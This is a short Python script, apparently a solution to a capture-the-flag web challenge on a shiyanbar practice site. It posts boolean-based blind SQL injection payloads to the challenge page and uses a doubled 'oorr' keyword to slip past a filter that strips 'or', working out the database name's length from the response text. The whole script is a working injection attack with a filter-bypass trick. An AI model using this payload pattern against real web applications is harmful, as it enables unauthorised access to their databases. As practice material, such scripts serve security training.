#!/usr/bin/python
import requests
print("start")
str = "You are in"
url = "http://ctf5.shiyanbar.com/web/earnest/index.php"
for i in range(1,30):
    key = {'id':"0'oorr(length(database())=%s)oorr'0"%i}
    res = requests.post(url,data=key).text
    print(i)
    if str in res:
        print('database length: %s'%i)
        break
print("end!")
